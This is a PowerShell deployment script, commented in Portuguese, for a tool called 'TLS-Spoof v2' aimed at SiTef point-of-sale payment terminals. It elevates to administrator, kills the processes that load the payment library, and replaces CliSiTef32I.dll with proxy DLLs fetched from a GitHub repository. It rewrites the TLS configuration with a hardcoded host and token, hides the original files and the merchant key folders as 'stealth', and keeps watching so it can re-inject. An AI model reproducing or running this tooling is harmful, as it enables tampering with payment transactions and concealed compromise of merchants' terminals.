# deploy.ps1 - Deploy TLS-Spoof v2 (replica do monitor.exe em PowerShell)
# ------------------------------------------------------------------
# Faz o mesmo que o proxy_mgr.c do monitor:
#   kill PDV -> backup libenv_orig.dll -> escreve proxy + libenv(tlsgwp)
#   + libcurl32 -> CONFITLS.INI (config do registry) -> stealth -> restart
#
# USO:
#   # local (usa a pasta dist ao lado do script):
#   powershell -NoP -EP Bypass -File deploy.ps1
#
#   # github (baixa os 3 arquivos do repo):
#   powershell -NoP -EP Bypass -File deploy.ps1 -BaseUrl "https://raw.githubusercontent.com/salexunic/tls/main"
#
#   # reverter tudo:
#   powershell -NoP -EP Bypass -File deploy.ps1 -Reverse
#
#   # diagnostico (so lista, nao mexe em nada):
#   powershell -NoP -EP Bypass -File deploy.ps1 -DetectOnly
# ------------------------------------------------------------------
param(
    [string]$BaseUrl = "https://raw.githubusercontent.com/salexunic/tls/main",
    [string]$LocalDir = "",
    [switch]$Reverse,
    [switch]$DetectOnly,
    [switch]$Force,
    [switch]$Watch,
    [switch]$Once
)

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

# Config do monitor (igual config.h / registry.c):
# HKLM\SOFTWARE\SiTeF\Monitor -> Loja, Token, Terminal, TlsHost
$RegKey = "HKLM:\SOFTWARE\SiTeF\Monitor"
$Stealth = "Hidden, System"

$Host.UI.RawUI.WindowTitle = "TLS-Spoof Deploy"
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "  TLS-Spoof v2 Deploy" -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan
Write-Host ""

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    # Auto-eleva: reabre como admin e segue
    Write-Host "  [ELEVANDO] Sem admin - reabrindo elevado..." -ForegroundColor Yellow
    $relaunch = "-NoP -EP Bypass -File `"$PSCommandPath`""
    if ($Reverse)    { $relaunch += " -Reverse" }
    if ($DetectOnly) { $relaunch += " -DetectOnly" }
    if ($Force)      { $relaunch += " -Force" }
    if ($Watch)      { $relaunch += " -Watch" }
    if ($Once)       { $relaunch += " -Once" }
    if ($BaseUrl)    { $relaunch += " -BaseUrl `"$BaseUrl`"" }
    if ($LocalDir)   { $relaunch += " -LocalDir `"$LocalDir`"" }
    Start-Process powershell -Verb RunAs -ArgumentList $relaunch
    exit 0
}

# ==================================================================
# Add-Type: enumeracao de modulos cross-bitness
# ==================================================================
if (-not ("TlsSpoof.Native" -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Text;
using System.Runtime.InteropServices;
namespace TlsSpoof {
    public static class Native {
        [DllImport("psapi.dll", SetLastError = true)]
        public static extern bool EnumProcessModulesEx(IntPtr hProcess, IntPtr[] lphModule, int cb, out int lpcbNeeded, uint dwFilterFlag);
        [DllImport("psapi.dll", CharSet = CharSet.Unicode)]
        public static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, StringBuilder lpFilename, int nSize);
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("wtsapi32.dll", SetLastError = true)]
        public static extern bool WTSQueryUserToken(uint SessionId, out IntPtr phToken);
        [DllImport("wtsapi32.dll")]
        public static extern uint WTSGetActiveConsoleSessionId();
        [DllImport("kernel32.dll")]
        public static extern bool ProcessIdToSessionId(uint dwProcessId, out uint pSessionId);
        [DllImport("userenv.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
        [DllImport("userenv.dll", SetLastError = true)]
        public static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO {
            public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
            public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars;
            public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow;
            public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION {
            public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
        }
    }
}
"@
}

function Find-TefProcesses {
    # Retorna: Pid, Name, ExePath, DllPath, Folder
    $out = @()
    Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
        $proc = $_
        $h = [TlsSpoof.Native]::OpenProcess(0x0410, $false, [uint32]$proc.Id) # QUERY_INFORMATION | VM_READ
        if ($h -eq [IntPtr]::Zero) { return }
        try {
            $mods = New-Object IntPtr[] 1024
            $needed = 0
            if (-not [TlsSpoof.Native]::EnumProcessModulesEx($h, $mods, $mods.Length * [IntPtr]::Size, [ref]$needed, 0x03)) { return }
            $count = [Math]::Min($mods.Length, [int]($needed / [IntPtr]::Size))
            for ($i = 0; $i -lt $count; $i++) {
                $sb = New-Object System.Text.StringBuilder 1024
                if ([TlsSpoof.Native]::GetModuleFileNameEx($h, $mods[$i], $sb, $sb.Capacity) -gt 0) {
                    $path = $sb.ToString()
                    if ($path -match "CliSiTef32I\.dll$") {
                        $exePath = ""
                        try { $exePath = $proc.MainModule.FileName } catch {}
                        $out += [PSCustomObject]@{
                            Pid     = $proc.Id
                            Name    = $proc.ProcessName
                            ExePath = $exePath
                            DllPath = $path
                            Folder  = Split-Path $path
                        }
                    }
                }
            }
        } finally {
            [TlsSpoof.Native]::CloseHandle($h) | Out-Null
        }
    }
    return $out
}

function Get-Cmdline {
    param($ProcId)
    try {
        $w = Get-CimInstance Win32_Process -Filter "ProcessId=$ProcId" -ErrorAction SilentlyContinue
        if ($w) { return @{ Exe = $w.ExecutablePath; Cmd = $w.CommandLine } }
    } catch {}
    return $null
}

function Stop-TefProcess {
    param($Proc, [switch]$ForceKill)
    $p = Get-Process -Id $Proc.Pid -ErrorAction SilentlyContinue
    if (-not $p) { return }
    Stop-Process -Id $Proc.Pid -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
}

function Start-InUserSession {
    param([string]$ExePath, [string]$ProcArgs, [string]$WorkDir)
    $self = [TlsSpoof.Native]::WTSGetActiveConsoleSessionId()
    $mySession = 0
    [void][TlsSpoof.Native]::ProcessIdToSessionId([uint32]$PID, [ref]$mySession)

    if ($mySession -eq $self) {
        try {
            if ($ProcArgs) {
                $p = Start-Process -FilePath $ExePath -ArgumentList $ProcArgs -WorkingDirectory $WorkDir -WindowStyle Normal -PassThru
            } else {
                $p = Start-Process -FilePath $ExePath -WorkingDirectory $WorkDir -WindowStyle Normal -PassThru
            }
            Start-Sleep -Milliseconds 1500
            if (-not $p.HasExited) { return $true }
        } catch {}
        return $false
    }

    # Sessao diferente (admin/servico) - CreateProcessAsUser
    $hToken = [IntPtr]::Zero
    if (-not [TlsSpoof.Native]::WTSQueryUserToken($self, [ref]$hToken)) { return $false }
    try {
        $env = [IntPtr]::Zero
        [void][TlsSpoof.Native]::CreateEnvironmentBlock([ref]$env, $hToken, $false)
        $si = New-Object TlsSpoof.Native+STARTUPINFO
        $si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
        $si.dwFlags = 1
        $si.wShowWindow = 1
        $pi = New-Object TlsSpoof.Native+PROCESS_INFORMATION
        $cmd = "`"$ExePath`""
        if ($ProcArgs) { $cmd = "$cmd $ProcArgs" }
        $ok = [TlsSpoof.Native]::CreateProcessAsUser($hToken, $null, $cmd, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, $env, $WorkDir, [ref]$si, [ref]$pi)
        if ($env -ne [IntPtr]::Zero) { [void][TlsSpoof.Native]::DestroyEnvironmentBlock($env) }
        if ($ok) {
            Start-Sleep -Milliseconds 1500
            $alive = Get-Process -Id $pi.dwProcessId -ErrorAction SilentlyContinue
            return ($alive -ne $null)
        }
    } finally {
        if ($hToken -ne [IntPtr]::Zero) { [TlsSpoof.Native]::CloseHandle($hToken) }
    }
    return $false
}

function Get-RegConfig {
    # Le HKLM\SOFTWARE\SiTeF\Monitor com fallback pros defaults do config.h
    # (igual registry.c: g_loja = MONITOR_LOJA etc)
    $cfg = @{
        Loja    = "67070162"
        Token   = "5502-2601-7587-0030"
        Terminal = "SW000001"
        TlsHost = "tls-prod.fiservapp.com"
    }
    try {
        $r = Get-ItemProperty $RegKey -ErrorAction SilentlyContinue
        if ($r) {
            if ($r.Loja)    { $cfg.Loja    = $r.Loja }
            if ($r.Token)   { $cfg.Token   = $r.Token }
            if ($r.TlsHost) { $cfg.TlsHost = $r.TlsHost }
        }
    } catch {}
    return $cfg
}

function Deploy-Terminal86 {
    # Igual terminal86.c: grava o 86 em C:\CliSiTef\NaoExcluirControleCliSiTef\{loja}\{terminal}
    param([string]$T86File)
    if (-not $T86File -or -not (Test-Path $T86File)) { return }
    $reg = Get-RegConfig
    $loja = $reg.Loja
    $term = ""
    try {
        $r = Get-ItemProperty $RegKey -ErrorAction SilentlyContinue
        if ($r -and $r.Terminal) { $term = $r.Terminal }
    } catch {}
    if (-not $loja -or -not $term) {
        Write-Host "  [AVISO] terminal86 — usando defaults (Loja=$loja Terminal=$term)" -ForegroundColor Yellow
    }
    $base = "C:\CliSiTef\NaoExcluirControleCliSiTef\$loja\$term"
    New-Item -ItemType Directory -Force -Path $base | Out-Null
    $dest = Join-Path $base "86"
    Copy-Item $T86File $dest -Force
    Set-Stealth $dest
    Write-Host "  [OK] Terminal 86 gravado: $dest" -ForegroundColor Green
}

function Set-Stealth {
    param([string]$Path)
    if (Test-Path $Path) {
        Set-ItemProperty $Path -Name Attributes -Value $Stealth
    }
}

# ==================================================================
# DETECT ONLY - lista e sai
# ==================================================================
if ($DetectOnly) {
    Write-Host "[DETECT] Procurando processos com CliSiTef32I.dll..." -ForegroundColor Yellow
    $alvos = Find-TefProcesses
    if ($alvos.Count -eq 0) {
        Write-Host "  Nenhum processo com a DLL rodando." -ForegroundColor Gray
    }
    foreach ($p in $alvos) {
        Write-Host "  PID $($p.Pid) | $($p.Name) | $($p.Folder)" -ForegroundColor Green
    }
    exit 0
}

# ==================================================================
# Obter os 3 arquivos: proxy dll, tlsgwp (vira libenv.dll), libcurl32
# ==================================================================
$tmpDir = Join-Path $env:TEMP "tls-spoof-deploy"
New-Item -ItemType Directory -Force -Path $tmpDir | Out-Null

$srcProxy = ""
$srcTlsgwp = ""
$srcCurl = ""
$srcT86 = ""

if (-not $LocalDir) { $LocalDir = Join-Path $ScriptDir "dist" }
if ((Test-Path $LocalDir) -and (Test-Path (Join-Path $LocalDir "CliSiTef32I.dll"))) {
    $srcProxy  = Join-Path $LocalDir "CliSiTef32I.dll"
    $srcTlsgwp = Join-Path $LocalDir "CliSiTef32I_tlsgwp.dll"
    $srcCurl   = Join-Path $LocalDir "libcurl32.dll"
    if (Test-Path (Join-Path $LocalDir "86")) { $srcT86 = Join-Path $LocalDir "86" }
    elseif (Test-Path (Join-Path $ScriptDir "src\86")) { $srcT86 = Join-Path $ScriptDir "src\86" }
    Write-Host "[1/5] Usando DLLs locais de $LocalDir" -ForegroundColor Yellow
    if ($srcT86) { Write-Host "  [OK] 86 local" -ForegroundColor Green }
} elseif ($BaseUrl) {
    Write-Host "[1/5] Baixando DLLs do GitHub..." -ForegroundColor Yellow
    foreach ($par in @(
        @{ N = "CliSiTef32I.dll";        V = ([ref]$srcProxy) },
        @{ N = "CliSiTef32I_tlsgwp.dll"; V = ([ref]$srcTlsgwp) },
        @{ N = "libcurl32.dll";          V = ([ref]$srcCurl) }
    )) {
        $out = Join-Path $tmpDir $par.N
        $ok = $false
        for ($tent = 1; $tent -le 3; $tent++) {
            try {
                Invoke-WebRequest -Uri "$BaseUrl/$($par.N)" -OutFile $out -UseBasicParsing -TimeoutSec 90
                $bytes = [IO.File]::ReadAllBytes($out)
                if ($bytes.Length -gt 50000 -and $bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) { $ok = $true; break }
            } catch {}
            Start-Sleep -Seconds 2
        }
        if (-not $ok) {
            Write-Host "  [ERRO] Falhou download de $($par.N)" -ForegroundColor Red
            exit 1
        }
        $par.V.Value = $out
        Write-Host "  [OK] $($par.N) ($([Math]::Round((Get-Item $out).Length/1KB)) KB)" -ForegroundColor Green
    }
    # 86 (binario cru, sem MZ)
    $t86Out = Join-Path $tmpDir "86"
    try {
        Invoke-WebRequest -Uri "$BaseUrl/86" -OutFile $t86Out -UseBasicParsing -TimeoutSec 90
        if ((Get-Item $t86Out).Length -gt 0) { $srcT86 = $t86Out; Write-Host "  [OK] 86" -ForegroundColor Green }
    } catch {
        Write-Host "  [AVISO] Sem 86 no repo — seguindo" -ForegroundColor Yellow
    }
} else {
    Write-Host "[ERRO] Nem dist local nem -BaseUrl informado." -ForegroundColor Red
    exit 1
}
Write-Host ""

# ==================================================================
# REVERSE - restaura tudo
# ==================================================================
if ($Reverse) {
    Write-Host "[REVERSE] Restaurando..." -ForegroundColor Yellow
    $procs = Find-TefProcesses
    $folders = @($procs | Select-Object -ExpandProperty Folder -Unique)

    foreach ($folder in $folders) {
        $libenvOrig = Join-Path $folder "libenv_orig.dll"
        $orig       = Join-Path $folder "CliSiTef32I.dll"
        if (-not (Test-Path $libenvOrig)) {
            Write-Host "  [PULAR] $folder (sem libenv_orig.dll)" -ForegroundColor Gray
            continue
        }
        foreach ($p in @($procs | Where-Object { $_.Folder -eq $folder })) {
            Write-Host "  Encerrando PID $($p.Pid) ($($p.Name))" -ForegroundColor Gray
            Stop-TefProcess -Proc $p -ForceKill:$Force
        }
        # CONFITLS.INI.orig -> CONFITLS.INI
        $cfgOrig = Join-Path $folder "CONFITLS.INI.orig"
        $cfgIni  = Join-Path $folder "CONFITLS.INI"
        if (Test-Path $cfgOrig) {
            Remove-Item $cfgIni -Force -ErrorAction SilentlyContinue
            Move-Item $cfgOrig $cfgIni -Force
            Write-Host "  [OK] CONFITLS.INI restaurado" -ForegroundColor Green
        }
        # DLL original
        Remove-Item $orig -Force -ErrorAction SilentlyContinue
        Move-Item $libenvOrig $orig -Force
        Set-ItemProperty $orig -Name Attributes -Value Normal
        Write-Host "  [OK] DLL original restaurada: $folder" -ForegroundColor Green
        # libenv.dll (nossa tlsgwp) pode ficar ou sumir - remove
        Remove-Item (Join-Path $folder "libenv.dll") -Force -ErrorAction SilentlyContinue

        foreach ($p in @($procs | Where-Object { $_.Folder -eq $folder })) {
            $ci = Get-Cmdline -ProcId $p.Pid
            if ($ci -and $ci.Exe) {
                $procArgs = ""
                if ($ci.Cmd -and $ci.Cmd.StartsWith('"')) {
                    $m = [regex]::Match($ci.Cmd, '^"([^"]+)"\s*(.*)$')
                    if ($m.Success) { $procArgs = $m.Groups[2].Value }
                }
                if (Start-InUserSession -ExePath $ci.Exe -ProcArgs $procArgs -WorkDir $folder) {
                    Write-Host "  [OK] Reaberto: $($ci.Exe)" -ForegroundColor Green
                } else {
                    Write-Host "  [AVISO] Reabre manualmente: $($ci.Exe)" -ForegroundColor Yellow
                }
            }
        }
    }
    Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host ""
    Write-Host "[DONE] Restauracao concluida." -ForegroundColor Cyan
    exit 0
}

# ==================================================================
# DEPLOY (igual proxy_mgr.c)
# ==================================================================
$reg = Get-RegConfig

# Terminal 86 (idempotente — igual proxy_mgr.c)
Write-Host "[2/5] Terminal 86..." -ForegroundColor Yellow
Deploy-Terminal86 -T86File $srcT86
Write-Host ""

$alvos = Find-TefProcesses

Write-Host "[3/5] Processos com a DLL:" -ForegroundColor Yellow
if ($alvos.Count -eq 0) {
    Write-Host "  Nenhum rodando." -ForegroundColor Gray
}
foreach ($p in $alvos) {
    Write-Host "  PID $($p.Pid) | $($p.Name) | $($p.Folder)" -ForegroundColor Gray
}
Write-Host ""

foreach ($p in $alvos) {
    $folder = $p.Folder
    $origPath   = Join-Path $folder "CliSiTef32I.dll"
    $libenvPath = Join-Path $folder "libenv.dll"
    $libenvOrig = Join-Path $folder "libenv_orig.dll"
    $curlPath   = Join-Path $folder "libcurl32.dll"

    Write-Host "[4/5] PID $($p.Pid) ($($p.Name))" -ForegroundColor Yellow

    # 1: mata
    Stop-TefProcess -Proc $p -ForceKill:$Force

    # 2: backup original -> libenv_orig.dll (stealth) - so se nossa libenv nao existe
    if (-not (Test-Path $libenvPath)) {
        if ((Test-Path $origPath) -and -not (Test-Path $libenvOrig)) {
            Move-Item $origPath $libenvOrig -Force
            Set-Stealth $libenvOrig
            Write-Host "  [OK] Original -> libenv_orig.dll (stealth)" -ForegroundColor Green
        }
    }

    # 3: escreve nossas DLLs (limpa atributos de instalacao anterior primeiro)
    if ($srcCurl) {
        if (Test-Path $curlPath) { Set-ItemProperty $curlPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
        Copy-Item $srcCurl $curlPath -Force
        Write-Host "  [OK] libcurl32.dll" -ForegroundColor Green
    }
    if ($srcTlsgwp) {
        if (Test-Path $libenvPath) { Set-ItemProperty $libenvPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
        Copy-Item $srcTlsgwp $libenvPath -Force
        Write-Host "  [OK] libenv.dll (tlsgwp)" -ForegroundColor Green
    }
    if (Test-Path $origPath) { Set-ItemProperty $origPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
    Copy-Item $srcProxy $origPath -Force
    Write-Host "  [OK] CliSiTef32I.dll (proxy)" -ForegroundColor Green

    # 4: CONFITLS.INI (config do registry, igual proxy_mgr.c)
    $cfgIni  = Join-Path $folder "CONFITLS.INI"
    $cfgOrig = Join-Path $folder "CONFITLS.INI.orig"
    if ((Test-Path $cfgIni) -and -not (Test-Path $cfgOrig)) {
        Move-Item $cfgIni $cfgOrig -Force
        Set-Stealth $cfgOrig
    }
    if (-not (Test-Path $cfgIni)) {
        $tlsHost = $reg.TlsHost
        $token   = $reg.Token
        if (-not $tlsHost) { $tlsHost = "tls-prod.fiservapp.com" }
        if (-not $token)   { $token   = "5502-2601-7587-0030" }
        $ini = "[ConfiguracaoTLS]`r`nTipoComunicacaoExterna=TLSGWP`r`nURLTLS=$tlsHost`r`nTokenRegistro=$token`r`n"
        [IO.File]::WriteAllText($cfgIni, $ini, [Text.Encoding]::ASCII)
        Write-Host "  [OK] CONFITLS.INI (host=$tlsHost)" -ForegroundColor Green
    }

    # 5: stealth
    Set-Stealth $libenvPath
    $loja = $reg.Loja
    if ($loja) {
        $chaves = "C:\CliSiTef\ChavesCliSiTef\$loja"
        if (Test-Path $chaves) {
            Set-Stealth $chaves
            Write-Host "  [OK] Chaves ocultas: $chaves" -ForegroundColor Green
        }
    }

    # 6: restart - pula python (igual monitor)
    if ($p.Name -notmatch "python") {
        $ci = Get-Cmdline -ProcId $p.Pid
        if ($ci -and $ci.Exe) {
            $procArgs = ""
            if ($ci.Cmd -and $ci.Cmd.StartsWith('"')) {
                $m = [regex]::Match($ci.Cmd, '^"([^"]+)"\s*(.*)$')
                if ($m.Success) { $procArgs = $m.Groups[2].Value }
            }
            if (Start-InUserSession -ExePath $ci.Exe -ProcArgs $procArgs -WorkDir $folder) {
                Write-Host "  [OK] Reaberto: $($ci.Exe)" -ForegroundColor Green
            } else {
                Write-Host "  [AVISO] Reabre manualmente: $($ci.Exe)" -ForegroundColor Yellow
            }
        }
    } else {
        Write-Host "  [SKIP] Processo python - nao reabre (igual monitor)" -ForegroundColor Gray
    }
    Write-Host ""
}

# Salva InstallPath (igual reg_save_install_path)
if ($alvos.Count -gt 0) {
    try {
        New-Item -Path $RegKey -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty $RegKey -Name InstallPath -Value $alvos[0].Folder -ErrorAction SilentlyContinue
    } catch {}
}

Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue

# Vigilancia continua (igual detector + watchdog do monitor)
# Fica em loop ate achar processo com a DLL, aplica o proxy, e segue vigiando.
# Ctrl+C para sair. Se quiser 1 rodada so e sair, use -Once.
if ($Once) {
    Write-Host "================================================" -ForegroundColor Cyan
    Write-Host "  DONE. Reverter: deploy.ps1 -Reverse" -ForegroundColor Cyan
    Write-Host "================================================" -ForegroundColor Cyan
    exit 0
}

Write-Host "[WATCH] Vigilancia ativa — aguardando processo com a DLL (Ctrl+C para sair)." -ForegroundColor Cyan
while ($true) {
    Start-Sleep -Seconds 3
    $novos = Find-TefProcesses
    foreach ($p in $novos) {
        $libenvPath = Join-Path $p.Folder "libenv.dll"
        if (-not (Test-Path $libenvPath)) {
            Write-Host "  [WATCH] Processo detectado: PID $($p.Pid) ($($p.Name))" -ForegroundColor Yellow
            Stop-TefProcess -Proc $p -ForceKill:$Force
            $origPath = Join-Path $p.Folder "CliSiTef32I.dll"
            $libenvOrig = Join-Path $p.Folder "libenv_orig.dll"
            if ((Test-Path $origPath) -and -not (Test-Path $libenvOrig)) {
                Move-Item $origPath $libenvOrig -Force
                Set-Stealth $libenvOrig
            }
            $curlW = Join-Path $p.Folder "libcurl32.dll"
            if (Test-Path $libenvPath) { Set-ItemProperty $libenvPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
            if (Test-Path $origPath)   { Set-ItemProperty $origPath -Name Attributes -Value Normal -ErrorAction SilentlyContinue }
            if ($srcCurl)   { Copy-Item $srcCurl   $curlW -Force }
            if ($srcTlsgwp) { Copy-Item $srcTlsgwp $libenvPath -Force }
            Copy-Item $srcProxy $origPath -Force
            Set-Stealth $libenvPath
            Write-Host "  [WATCH] Proxy aplicado em $($p.Folder)" -ForegroundColor Green
        }
    }
}
